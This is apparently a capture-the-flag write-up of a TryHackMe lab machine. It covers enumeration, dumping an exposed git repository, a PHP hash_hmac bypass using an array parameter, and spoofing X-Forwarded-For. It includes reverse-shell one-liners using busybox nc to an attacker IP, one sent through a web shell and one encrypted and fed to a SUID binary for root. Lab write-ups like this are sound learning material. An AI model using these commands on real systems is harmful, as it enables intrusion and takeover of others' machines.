 ![Capture d'écran 2025-02-16 210013](https://github.com/user-attachments/assets/7bcfc279-52ae-451d-b448-e3e0594c386f)                     Real pentest findings combined (By [arcc](https://tryhackme.com/p/arcc))
### Recon 


First we need to scan the target machine (10.10.43.115) in order to find any open ports : 
```nmap 10.10.43.115 -p- -sV -sC -oN nmapres```



![Pasted image 20250215155509](https://github.com/user-attachments/assets/99f41411-dcd1-4ee9-a62a-a36f3743a4d9)

The scan reveals three open ports:

	- 2/tcp
	- 22/tcp
	- 80/tcp


I initially tried to find subdirectories using `gobuster`, but it didn’t return any results. So, I switched to `dirsearch`: 

```
dirsearch  -u http://harder.thm
```

![Capture d'écran 2025-02-15 163232](https://github.com/user-attachments/assets/9ec357ba-10ca-4c9f-bbea-065ccd487c49)

Unfortunately, this scan didn’t reveal much either, except for the **PHP version: 7.3.19**.

Next, I checked the HTTP headers and discovered something interesting: `pwd.harder.local`.

![Pasted image 20250215170112](https://github.com/user-attachments/assets/cdd527ce-455a-4432-bd60-3d9c2dc10dd1)
This led me to a **login page**:


![Pasted image 20250215171102](https://github.com/user-attachments/assets/d06d5723-f4d1-42d6-95b1-10210fed1205)


Now, I ran another enumeration scan on this new domain using: 
```
gobuster dir -u http://pwd.harder.local/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words.txt  > gobusteres
```

![Pasted image 20250215171815](https://github.com/user-attachments/assets/60456266-8733-42dc-ad10-d31e90fa31d6)


This revealed a **`.git` repository (301)** and a **`.gitignore` file (200)**.

Checking the `.gitignore` file, I found two files of interest:
- `credentials.php`
- `secret.php`

![Pasted image 20250215172322](https://github.com/user-attachments/assets/2b2314dc-5f83-43f4-bcdc-0e8cb3cc04e7)

I continued my enumeration using: `dirsearch  -u http://pwd.harder.local/`



![Pasted image 20250215173822](https://github.com/user-attachments/assets/833493be-88e8-4017-85ec-8a9fff41fb70)


To retrieve the repository locally, I used: `./gitdumper.sh http://pwd.harder.local/.git/  ./repo_harder`  to get the repository on my local machine : 

![Pasted image 20250215174708](https://github.com/user-attachments/assets/6cd1f451-836e-48bc-86da-96ec5f6b8a84)

Among the retrieved files, I found `hmac.php`:

![Capture d'écran 2025-02-15 193923](https://github.com/user-attachments/assets/099ac4c2-84e0-4dbd-aab5-dd97a91272f6)

The script expects three parameters: : `h`, `host` and `n` . Looking into **PHP hash_hmac vulnerabilities**, : https://exploit-notes.hdks.org/exploit/web/php-hash-hmac-bypass/

We can bypass the PHP hash_hmac if we succed to set to `False` the third parameters ($secret) : `hash_hmac('sha256',hostname,false)` . And to exploit this, we need to set `n` as an **array**.

However, we must also bypass the following check:
	
	`if ($hm !== $_GET['h'])` ? 

To do this, I computed the expected **HMAC value** offline using a custom script:

**script.php :** 

````
<?php
$hm = hash_hmac('sha256', $_GET['host'], false);
print "hmac value : $hm"
?>
````

**payload :** `curl "http://localhost:8000/script.php?host=tryhackme.com"` 

Then we can get the hmac value for the `h` parameter : 

![Capture d'écran 2025-02-15 201658](https://github.com/user-attachments/assets/a0743c21-8c61-47d7-9940-19a3d436b1cd)

Now we have our three values for our three parameters : 

	- h  = 7e93acab486751d24a9129bb81cd387b0e2ba805635cfb219c4f10d6e3fd7198
	- host = tryhackme.com
	- n : Array


I then used **Burp Suite** to send the payload, which returned a **URL, username, and plaintext password**:

![Capture d'écran 2025-02-16 201853](https://github.com/user-attachments/assets/405f9139-2d68-4903-ab69-fefdd1ba6993)

I added the new domain `shell.harder.local` to my **hosts file** and found another **login page**. I used the obtained credentials:

```
e<...>:9<...>
```

...and they worked!

![Capture d'écran 2025-02-15 203030](https://github.com/user-attachments/assets/427d5a7d-538b-4868-89e9-47b8e7d40c80)

However, I encountered an error message. To bypass it, I added an **`X-Forwarded-For` header** in my HTTP request:

![Capture d'écran 2025-02-16 204928](https://github.com/user-attachments/assets/87492668-2035-4165-ba0e-5cdccd735a46)

![Capture d'écran 2025-02-16 210933](https://github.com/user-attachments/assets/4124d1e2-9818-4293-96fb-7786f614a554)

Now, I could see a **web shell** using the `cmd` parameter:

![Capture d'écran 2025-02-15 205941](https://github.com/user-attachments/assets/9a1de0cc-8034-4ad2-a4a5-6600bb11c3d0)

I used the following command to establish a **reverse shell**: `cmd=busybox nc 10.23.31.32 4321 -e sh`

### Foothold

![Capture d'écran 2025-02-15 215643](https://github.com/user-attachments/assets/91e970a6-3646-4c5b-80d0-8c2bd8567c87)

Now that I have a reverse shell, you can stabilize it using:

```
python3 -c "import pty; pty.spawn('/bin/ash')"
```

I then looked for more information and found the **user flag**:

![Capture d'écran 2025-02-16 205348](https://github.com/user-attachments/assets/f67b16d8-8861-430c-b3a0-0444ba3a9974)

Exploring further, I checked `/etc` and found **EVS’s password** inside the `periodic/evs-backup.sh` file :

![Capture d'écran 2025-02-16 205554](https://github.com/user-attachments/assets/527a5be9-c3c5-41b7-ad5f-b180ccead072)

I used it to switch to **evs’s account**:

![Capture d'écran 2025-02-17 195125](https://github.com/user-attachments/assets/4987d045-e375-4807-a26d-9c5344d20a02)

Next, I searched for **SUID binaries** using:
```
find / -type f -perm -4000 2>/dev/null
```
![Capture d'écran 2025-02-15 222637](https://github.com/user-attachments/assets/3900cd5e-d4d1-4347-b5d1-0259fe8d246f)
### Privilege Escalation & Exploitation

Since I found a **SUID binary**, I suspected I could escalate privileges.
I created a file containing a **reverse shell command**:

```
echo -n "busybox nc  10.23.31.32 4242 -e sh" > command

```
Then the file has been encrypted using GPG with AES-256 encryption:
```
gpg --symmetric --cipher-algo AES256 command
```

Then I've just typed a random passphrase `test`: 

![Capture d'écran 2025-02-15 223802](https://github.com/user-attachments/assets/009105af-047c-4fdd-9abc-41d366d389c1)

Then retyped it :

![Capture d'écran 2025-02-15 223824](https://github.com/user-attachments/assets/3cf40af5-f8d8-4ded-991a-88242a62a90c)

After entering a passphrase (`test`), I executed:

```
/usr/local/bin/executed-crypted command.jpg
```

That asked me to retype the passphrase (`test`) : 

![Capture d'écran 2025-02-15 223802](https://github.com/user-attachments/assets/b596a532-87bd-4148-8be1-c58000034344)

And I successfully obtained a root shell on my listener, allowing me to retrieve the **root flag** :

![Capture d'écran 2025-02-16 205816](https://github.com/user-attachments/assets/7b9b08e2-0872-4474-a63e-bf57bd20f6e4)

**Congratulations!** I hope you enjoyed this writeup. This CTF was a great exercise in **enumeration**, from identifying open ports and analyzing HTTP headers to exploiting misconfigurations and escalating privileges. It reinforced the importance of thorough reconnaissance and attention to detail.

Thanks for reading, and happy hacking!

![Capture d'écran 2025-02-15 225142](https://github.com/user-attachments/assets/db5c0217-a471-4836-ac6e-f7e22ff43383)



